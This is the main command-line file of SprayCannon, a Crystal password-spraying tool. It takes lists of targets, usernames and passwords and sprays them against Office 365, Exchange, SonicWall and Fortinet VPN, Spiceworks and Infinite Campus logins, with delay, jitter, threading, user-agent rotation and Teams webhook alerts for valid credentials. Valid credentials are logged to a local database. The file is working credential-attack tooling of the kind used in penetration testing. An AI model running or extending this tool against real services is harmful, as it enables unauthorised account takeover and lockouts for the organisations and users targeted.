require "option_parser"
require "colorize"
require "sqlite3"

require "./spray_types/sprayer"
require "./spray_types/o365"
require "./spray_types/fortigate"
require "./spray_types/sonicwall_virtualoffice"
require "./spray_types/sonicwall_virtualoffice_5.x"
require "./spray_types/sonicwall_digest"
require "./spray_types/ExchangeEAS"
require "./spray_types/ExchangeOWA"
require "./spray_types/fortigate_login"
require "./spray_types/spiceworks"
require "./spray_types/infinatecampus"


# require "./sprayer/smbsprayer"



############
# TODO LOG
############

version = "0.1.6"

# Feature requests 
# - timstamp the login, start, end - done!
# - set "spraygroup" or something to spray with no delay for 2 rounds then delay
# - include password list with repo??
# - verbose print out eas 403 means mailbox does not exist and password spray not working

# todo code wise 
# - finish verbose mode 
# - 

# obviously the most important part of the entire tool!!!
art = "
███████".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██████".colorize(:blue).to_s + "╗".colorize(:green).to_s + " ██████".colorize(:blue).to_s + "╗".colorize(:green).to_s + "  █████".colorize(:blue).to_s + "╗ ".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗   ".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗ ".colorize(:green).to_s + "██████".colorize(:blue).to_s + "╗ ".colorize(:green).to_s + "█████".colorize(:blue).to_s + "╗ ".colorize(:green).to_s + "███".colorize(:blue).to_s + "╗".colorize(:green).to_s + "   ██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "███".colorize(:blue).to_s + "╗   ".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + " ██████".colorize(:blue).to_s + "╗ ".colorize(:green).to_s + "███".colorize(:blue).to_s + "╗".colorize(:green).to_s + "   ██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "
██".colorize(:blue).to_s + "╔════╝".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔══".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔══".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔══".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗╚".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗ ".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔╝".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔════╝".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔══".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "████".colorize(:blue).to_s + "╗  ".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "████".colorize(:blue).to_s + "╗".colorize(:green).to_s + "  ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔═══".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "████".colorize(:blue).to_s + "╗".colorize(:green).to_s + "  ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "
███████".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██████".colorize(:blue).to_s + "╔╝".colorize(:green).to_s + "██████".colorize(:blue).to_s + "╔╝".colorize(:green).to_s + "███████".colorize(:blue).to_s + "║ ╚".colorize(:green).to_s + "████".colorize(:blue).to_s + "╔╝ ".colorize(:green).to_s + "██".colorize(:blue).to_s + "║    ".colorize(:green).to_s + " ███████".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + " ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + " ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "   ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + " ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "
╚════".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔═══╝".colorize(:green).to_s + " ██".colorize(:blue).to_s + "╔══".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔══".colorize(:green).to_s + "██".colorize(:blue).to_s + "║  ╚".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔╝  ".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "     ██".colorize(:blue).to_s + "╔══".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║╚".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║╚".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "   ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║╚".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "
███████".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "     ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "  ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "  ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "   ██".colorize(:blue).to_s + "║   ╚".colorize(:green).to_s + "██████".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██".colorize(:blue).to_s + "║ ".colorize(:green).to_s + " ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║ ╚".colorize(:green).to_s + "████".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║ ╚".colorize(:green).to_s + "████".colorize(:blue).to_s + "║╚".colorize(:green).to_s + "██████".colorize(:blue).to_s + "╔╝".colorize(:green).to_s + "██".colorize(:blue).to_s + "║ ╚".colorize(:green).to_s + "████".colorize(:blue).to_s + "║".colorize(:green).to_s + "
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝".colorize(:green).to_s + "
Built by: CausticKirbyZ (https://github.com/CausticKirbyZ/SprayCannon)
"



options = {
    "spraytype" => nil,
    "user-as-password" => false,
    "verbose" => false,
    # "target" => "",
    "target" => [] of String,
    "usernames" => [] of String,
    "passwords" => [] of String,
    "useragents" => [] of String,
    "delay" => 30,
    "jitter" => 1,
    "webhook" => nil,
    "domain" => "WORKGROUP",
    "db" => true,
    "threads" => 1,
    "user-as-password" => false,
    "user-password" => false
}




parser = OptionParser.new() do |opts|
    opts.banner = "\nCLI tool for sprayer crystal lib\n" + 
    "Sprays the target with options for lockout, mfa, jitter, delay.\n" + 
    "    " + "*".colorize(:yellow).to_s + "Not all services can have lockout/mfa detection and it is up to each module to implement it.\n"

    
    opts.separator("Global options:")
    opts.on("-s", "--spray-type=[spraytype]", "Set spray type. use --list-spraytypes to get current list") do |type|
        options["spraytype"] = type
    end

    opts.on("-t","--target=[ip/hostname]","Target to spray ( could also be a fireprox address )") do |target|
        # options["target"] = target.strip
        if File.exists?(target) 
            File.each_line(target) do |line|
                options["target"].as(Array(String)) << line.strip()
            end
        else 
            options["target"].as(Array(String)) << target.strip() # unless password.starts_with?("#")
        end
    end 
    
    opts.on("-u","--username=[name]", "Username or user txt file to spray from") do |uname|
        if File.exists?(uname) 
            File.each_line(uname) do |line|
                options["usernames"].as(Array(String)) << line.strip() # unless line.starts_with?("#")
            end
        else 
            options["usernames"].as(Array(String)) << uname.strip
        end
    end 
    
    opts.on("-p","--password=[password]","Target to spray") do |password|
        if File.exists?(password) 
            File.each_line(password) do |line|
                options["passwords"].as(Array(String)) << line.strip()
            end
        else 
            options["passwords"].as(Array(String)) << password.strip() # unless password.starts_with?("#")
        end
    end 
    
    opts.on("-d","--delay=[time]","time in seconds to delay between password attempts") do |time| 
        options["delay"] = time.to_i
    end
    
    opts.on("-j","--jitter=[time]","time in milliseconds to delay between individual account attempts. default is 1000.") do |time| 
        options["jitter"] = time.to_i
    end

    opts.on("--domain=[domain]","Sets the domain for options that require domain specification.") do |d|
        options["domain"] = d 
    end 

    opts.on("-h", "--help","Print Help menu") do
        puts art
        puts opts
        exit(0)
    end
    opts.on("--version","Print current version") do
        puts version
        exit(0)
    end

    opts.on("-v","--verbose","Print verbose information") do
        options["verbose"] = true 
    end

    opts.separator("Additional Options:")
    
    opts.on("--threads=[count]","Use worker threads to drasticly speed things up!(default is 1)") do |tcount|
        options["threads"] = tcount.to_i
    end  

    opts.on("--nodb","does not use the database") do
        options["db"] = false
    end 
    
    opts.on("--user-as-password","Sets the user and password to the same string") do
        options["user-as-password"] = true
    end
    
    opts.on("--user-pass-format=[filename]","Supplied file in 'user:password' format") do |upffile|
        options["user-password"] = true
        if File.exists?(upffile) 
            File.each_line(upffile) do |line|
                options["usernames"].as(Array(String)) << line.strip().split(":")[0]
                options["passwords"].as(Array(String)) << line.strip().split(":")[1..].join(':') # make sure if theres a password with : in it to add it back
            end
        end
    end 
    
    opts.on("--webhook=[url]","Will send a teams webhook if valid credential is found!!") do |webhook|
        options["webhook"] = webhook
    end 
    
    opts.on("--useragent=[agentstring]","Use a custom useragent string, or a file containing useragents(will chose randomly from them).") do |useragent|
        if File.exists?(useragent) 
            File.each_line(useragent) do |line|
                options["useragents"].as(Array(String)) << line.strip()
            end
        else 
            options["useragents"].as(Array(String)) << useragent.strip()
        end
    end 
    
    opts.on("--list-spraytypes","List the available spraytypes.") do 
        ["msol (o365)","ExchageEAS","ExchageOWA","vpn_sonicwall_virtualoffice","vpn_sonicwall_virtualoffice_5x","vpn_sonicwall_digest","vpn_fortinet","spiceworks","InfinateCampus"].each {|t| puts t}
        exit 0
    end 



    opts.invalid_option do |flag|
        STDERR.puts "ERROR: #{flag.colorize(:red).to_s} is not a valid option."
        STDERR.puts opts
        exit(1)
    end

    # opts.missing_option do |flag| 
    #     puts "Missing argument for: #{flag }"
    #     exit 1 
    # end
end

if ARGV.size < 1 
    parser.parse(["--help"])
else 
    begin 
        parser.parse
    rescue ex : OptionParser::MissingOption 
        if ex.message && ex.message.as(String).includes? "--useragent"
            STDERR.puts "using random useragents"
            options["useragents"] = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0"
                ]
        end
        # exit 1 
    # rescue KeyError
    #     puts "You didnt supply an argument....."
    #     exit 1
    # rescue ex
    #     puts ex.message 
    #     exit 1 
    end
end


if options["spraytype"].nil?
    puts "You need to enter a spraytype....".colorize(:red)
    exit 1
end



if options["verbose"].as(Bool)
    STDERR.puts options
end




if options["db"].as(Bool)
# open db and set up tables 
db = DB.open "sqlite3://./spray.db"

db.exec "create table if not exists username( usernameid integer primary key autoincrement, username varchar(255) unique not null);"

db.exec "create table if not exists password( passwordid integer primary key autoincrement, password varchar(255) unique not null);"

db.exec "create table if not exists passwords_sprayed(  usernameid integer not null , 
                                                        passwordid integer not null ,
                                                        date_time date,
                                                        primary key(usernameid, passwordid) , 
                                                        foreign key (usernameid) references username(usernameid), 
                                                        foreign key (passwordid) references password(passwordid)                                                        
                                                        );"

db.exec "create table if not exists valid_passwords(    usernameid integer not null , 
                                                        passwordid integer not null ,
                                                        date_time date,
                                                        primary key(usernameid, passwordid) , 
                                                        foreign key (usernameid) references username(usernameid), 
                                                        foreign key (passwordid) references password(passwordid)
                                                     );"
end


# s = Sprayer.new("test", "pass")
# puts options["spraytype"]
case options["spraytype"].as(String).downcase 
when "testing" # this ones just used for testing purposes.... not really a spraytype more fuctionality test 
    s = Sprayer.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
when "vpnfortigate"
    STDERR.puts "not confirmed to work"
    s = VPNFortigate.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
when "fortigate_login"
    STDERR.puts "not confirmed to work"
    s = Fortigate_Login.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
when "o365","office365"
    STDERR.puts "Currently in Beta. may not be 100% reliable!!!".colorize(:yellow)
    s = O365.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
    s.target = "https://login.microsoft.com"
    # exit 0 
when "vpncisco" # need to go find a vpn to check it on and port the ruby file  (and find the ruby file )
    STDERR.puts "Not implemented yet"
    # s = VPNCisco.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
    exit 0 
when "vpn_sonicwall_digest"
    s = Sonicwall_Digest.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
    
when "vpn_sonicwall_virtualoffice"
    s = Sonicwall_VirtualOffice.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
    
when "vpn_sonicwall_virtualoffice_5.x"
    s = Sonicwall_VirtualOffice_5x.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
# when "smb"
#     s = SMBsprayer.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
when "exchangeeas"
    s = ExchageEAS.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
    s.domain = options["domain"].as(String)
when "exchangeowa"
    s = ExchangeOWA.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
    s.domain = options["domain"].as(String)
when "spiceworks"
    s = Spiceworks.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
when "infinatecampus"
    s = InfinateCampus.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
else 
    STDERR.puts "Not a valit sprayer type!!".colorize(:red)
    exit 1
end

exit if s.nil?
s.delay = options["delay"].as(Int32)
# s.target = options["target"].as(String) unless options["target"] == ""  # unless options["spraytype"].as(String).downcase == "o365"
s.jitter = options["jitter"].as(Int32)
s.webhook_url = options["webhook"].as(String) unless options["webhook"].nil?


# handle if theres multiple targets/multiple proxy endpoints
if options["target"].as( Array(String) ).size > 1 
    s.target = options["target"].as(Array(String))[0]
    s.targets = options["target"].as(Array(String))
else 
    s.target = options["target"].as(Array(String))[0]
end


if  options["user-as-password"] && options["user-password"]
    STDERR.puts "you cant set both user-password and user-as-password at the same time. Pick ONE!"
end

if options["user-as-password"]
    # options["passwords"] = options["usernames"]
   s.uap = true
end

if options["user-password"]
    # options["passwords"] = options["usernames"]
   s.upf = true
end

# puts "rand: #{max(rand())}"
start_time = Time.local.to_s("%Y-%m-%d %H:%M:%S")
STDERR.puts "Starting spraying at: " + "#{Time.local.to_s("%Y-%m-%d %H:%M:%S")}".colorize(:yellow).to_s
# STDERR.puts "Spraying...".colorize(:yellow)
STDERR.puts "Username, Password, Valid, Lockout, MFA"

if options["db"].as(Bool)
    s.start(options["threads"].as(Int32), db)
else 
    s.start(options["threads"].as(Int32))
end

STDERR.puts "Done spraying now!!!".colorize(:green)
STDERR.puts "Started at:   #{start_time}"
STDERR.puts "Completed at: #{Time.local.to_s("%Y-%m-%d %H:%M:%S")}"